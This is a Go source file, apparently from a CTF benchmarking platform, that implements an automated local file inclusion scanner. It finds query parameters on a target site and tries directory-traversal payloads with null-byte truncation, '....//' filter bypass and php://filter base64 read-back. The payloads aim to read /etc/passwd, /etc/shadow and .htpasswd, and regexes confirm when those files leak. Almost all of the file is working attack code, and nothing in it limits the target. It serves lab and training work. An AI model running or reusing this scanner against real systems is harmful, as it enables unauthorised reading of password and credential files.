package ctfplatform

// web_evidence.go —— 非 flag 型"打穿证据"探测。
//
// 背景：基准题库的判分口径是 sha256(flag)，而真实靶场（如 LAMPSecurity CTF4）是
// "root 导向、全程不发 flag"。若把这类靶场硬塞进 flag 判分路径，只能得到 0 命中，
// 或更糟——伪造 flag 污染分数。因此本文件提供一条**旁路**：
//
//	ProbeSensitiveFileRead -> []WebEvidence   （不进 WebFinding，不参与 flag 判分）
//
// 它只回答"目标是否真的被打穿"（能否通过 LFI 读到 /etc/passwd、.htpasswd 等敏感文件），
// 供真实靶场对照与训练使用，对基准分数零影响。

import (
	"context"
	"encoding/base64"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// WebEvidence 是一条非 flag 型成功证据。
type WebEvidence struct {
	Kind    string // 证据类别，目前为 lfi_sensitive_file
	URL     string // 命中的完整请求 URL
	Param   string // 被注入的参数名
	Payload string // 生效的载荷
	Signal  string // 命中的敏感文件类别：etc_passwd / etc_shadow / htpasswd_hash
	Detail  string // 打码摘要（绝不落原文口令哈希）
}

var (
	// rePasswdSig 匹配 /etc/passwd 的 root 行（最可靠的"文件被读出"信号）。
	rePasswdSig = regexp.MustCompile(`(?m)^root:[^:\r\n]{0,64}:0:0:`)
	// rePasswdLine 统计账户行数（passwd 每行 7 段）。
	rePasswdLine = regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[^:\r\n]{0,128}:\d{1,6}:\d{1,6}:[^\r\n]*$`)
	// reShadowSig 匹配 /etc/shadow 的 root 行（哈希段 + 三个数字字段）。
	reShadowSig = regexp.MustCompile(`(?m)^root:[^:\r\n]{1,160}:\d{1,5}:\d{1,5}:\d{1,5}:`)
	// reHtpasswdSig 匹配 Apache 口令文件行：DES(13 字符) / apr1 / bcrypt。
	reHtpasswdSig = regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:(?:\$apr1\$[^\s<]{1,80}|\$2[aby]\$[^\s<]{1,80}|[A-Za-z0-9./]{13})\s*$`)
	// reB64Blob 抓长 base64 串（用于 php://filter/convert.base64-encode 回读）。
	reB64Blob = regexp.MustCompile(`[A-Za-z0-9+/]{48,}={0,2}`)
	// reHref 抓 href/action 里的链接，用于自行发现端点与参数名。
	reHref = regexp.MustCompile(`(?i)(?:href|action)\s*=\s*["']([^"']{1,200})["']`)
)

// defaultLFIParams 是常见的文件包含参数名（按命中概率排序）。
func defaultLFIParams() []string {
	return []string{"page", "file", "path", "template", "include", "inc", "doc", "view", "load", "read", "filename", "f"}
}

// lfiParamCandidates 合并题目线索与默认参数名，去重且限长。
func lfiParamCandidates(h WebHints) []string {
	seen := map[string]bool{}
	var out []string
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] || len(out) >= 8 {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, p := range h.Params {
		add(p)
	}
	for _, p := range defaultLFIParams() {
		add(p)
	}
	return out
}

// lfiPayloadCandidates 生成载荷：多级深度 × null-byte 截断 × 过滤绕过 × 编码回读。
// 注意 %00 必须保持字面量（不能再次 URL 编码），故调用方用裸串拼 query。
func lfiPayloadCandidates(h WebHints) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}

	// 题目直接给出的载荷优先（多为靶场实际可用形态）
	for _, p := range h.Payloads {
		if strings.Contains(p, "..") || strings.Contains(p, "passwd") || strings.Contains(p, "htpasswd") {
			add(p)
		}
	}

	// 多级深度：不同靶场的包含根目录深度不同，1..6 全覆盖
	for depth := 1; depth <= 6; depth++ {
		up := strings.Repeat("../", depth)
		add(up + "etc/passwd")
		add(up + "etc/passwd%00") // 对抗 include($page.".php") 的后缀拼接
	}
	// 绝对路径 + 截断
	add("/etc/passwd")
	add("/etc/passwd%00")
	// 敏感文件字典：Apache 口令文件与主机信息（CTF 提权链的常见下一跳）
	for depth := 1; depth <= 4; depth++ {
		up := strings.Repeat("../", depth)
		for _, f := range []string{
			"restricted/.htpasswd", ".htpasswd", "htpasswd", "conf/.htpasswd",
			"etc/hosts", "etc/shadow",
		} {
			add(up + f)
			add(up + f + "%00")
		}
	}
	// 过滤绕过：....// 归一化后仍是 ../
	for depth := 2; depth <= 6; depth += 2 {
		add(strings.Repeat("....//", depth) + "etc/passwd")
		add(strings.Repeat("....//", depth) + "etc/passwd%00")
	}
	// 编码回读：绕过内容过滤
	for depth := 3; depth <= 6; depth += 3 {
		add("php://filter/convert.base64-encode/resource=" + strings.Repeat("../", depth) + "etc/passwd")
	}
	return out
}

// buildProbeURL 拼接探测 URL。payload 原样保留（含 %00），不做二次转义。
func buildProbeURL(base, endpoint, param, payload string) string {
	b := strings.TrimSuffix(base, "/")
	if endpoint == "" {
		endpoint = "/"
	}
	if !strings.HasPrefix(endpoint, "/") {
		endpoint = "/" + endpoint
	}
	sep := "?"
	if strings.Contains(endpoint, "?") {
		sep = "&"
	}
	return b + endpoint + sep + param + "=" + payload
}

// classifySensitive 判断响应体是否泄漏了敏感文件，返回类别与打码摘要。
func classifySensitive(body []byte) (signal, detail string, ok bool) {
	text := string(body)

	if reShadowSig.MatchString(text) {
		return "etc_shadow", "命中 /etc/shadow 的 root 行（哈希已打码）", true
	}
	if rePasswdSig.MatchString(text) {
		n := len(rePasswdLine.FindAllString(text, 200))
		if n < 2 {
			n = 2 // 至少有 root 行
		}
		return "etc_passwd", "命中 /etc/passwd 的 root 行，账户行数≈" + itoaSmall(n), true
	}
	if m := reHtpasswdSig.FindAllString(text, 50); len(m) > 0 {
		algo := "DES-crypt"
		for _, line := range m {
			if strings.Contains(line, "$apr1$") {
				algo = "apr1-md5"
				break
			}
			if strings.Contains(line, "$2a$") || strings.Contains(line, "$2b$") || strings.Contains(line, "$2y$") {
				algo = "bcrypt"
				break
			}
		}
		return "htpasswd_hash", "命中 Apache 口令文件，条目数=" + itoaSmall(len(m)) + "，算法=" + algo + "（哈希已打码）", true
	}
	return "", "", false
}

// itoaSmall 把非负小整数转字符串（避免为几个数字引入 strconv 依赖噪音）。
func itoaSmall(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [8]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}

// decodeB64Sensitive 处理 php://filter 回读：从长 base64 串里解出敏感文件内容。
func decodeB64Sensitive(body []byte) (signal, detail string, ok bool) {
	for _, tok := range reB64Blob.FindAllString(string(body), 8) {
		raw, err := base64.StdEncoding.DecodeString(tok)
		if err != nil || len(raw) < 32 {
			continue
		}
		if s, d, ok2 := classifySensitive(raw); ok2 {
			return s, d + "（经 base64 回读）", true
		}
	}
	return "", "", false
}

// DiscoverWebParams 抓取入口页，提取端点与查询参数名。
// 目的：补上 exploitHintStages 在 Endpoints 为空时"整段跳过"的盲区——
// 让链路在题目描述没给线索时也能自己找到 ?page= 这类参数。
func DiscoverWebParams(ctx context.Context, baseURL string) (endpoints []string, params []string) {
	cl := webClient(8 * time.Second)
	code, body, _, err := webFetch(ctx, cl, baseURL)
	if err != nil || code <= 0 {
		return nil, nil
	}
	text := string(body)

	seenEP := map[string]bool{}
	seenP := map[string]bool{}
	for _, m := range reHref.FindAllStringSubmatch(text, 60) {
		raw := strings.TrimSpace(m[1])
		if raw == "" || strings.HasPrefix(raw, "#") || strings.HasPrefix(raw, "mailto:") || strings.HasPrefix(raw, "javascript:") {
			continue
		}
		u, err := url.Parse(raw)
		if err != nil {
			continue
		}
		ep := u.Path
		if ep != "" && len(endpoints) < 8 && !seenEP[ep] {
			seenEP[ep] = true
			endpoints = append(endpoints, ep)
		}
		for name := range u.Query() {
			if len(params) < 12 && !seenP[name] {
				seenP[name] = true
				params = append(params, name)
			}
		}
	}
	return endpoints, params
}

// ProbeSensitiveFileRead 对 baseURL 做文件包含探测，返回非 flag 型打穿证据。
// 与 flag 判分完全隔离：不写 WebFinding、不影响基准分数。
func ProbeSensitiveFileRead(ctx context.Context, baseURL string, hints WebHints) []WebEvidence {
	cl := webClient(8 * time.Second)

	eps := append([]string{}, hints.Endpoints...)
	if len(eps) == 0 {
		if dEps, dParams := DiscoverWebParams(ctx, baseURL); len(dEps) > 0 {
			eps = dEps
			if len(hints.Params) == 0 {
				hints.Params = dParams
			}
		}
	}
	if len(eps) == 0 {
		eps = []string{"/"}
	}
	if len(eps) > 3 {
		eps = eps[:3]
	}

	params := lfiParamCandidates(hints)
	payloads := lfiPayloadCandidates(hints)

	visited := map[string]bool{}
	var out []WebEvidence
	signals := map[string]bool{}
	budget := 180 // 请求上限，防止组合爆炸拖垮整轮

	for _, ep := range eps {
		for _, param := range params {
			for _, pl := range payloads {
				if budget <= 0 || len(out) >= 4 {
					return out
				}
				u := buildProbeURL(baseURL, ep, param, pl)
				if visited[u] {
					continue
				}
				visited[u] = true
				budget--

				code, body, _, err := webFetch(ctx, cl, u)
				if err != nil || code <= 0 || len(body) == 0 {
					continue
				}
				sig, detail, ok := classifySensitive(body)
				if !ok && strings.Contains(pl, "base64-encode") {
					sig, detail, ok = decodeB64Sensitive(body)
				}
				if !ok {
					continue
				}
				key := sig + "|" + param
				if signals[key] {
					continue
				}
				signals[key] = true
				out = append(out, WebEvidence{
					Kind: "lfi_sensitive_file", URL: u, Param: param,
					Payload: pl, Signal: sig, Detail: detail,
				})
			}
		}
	}
	return out
}
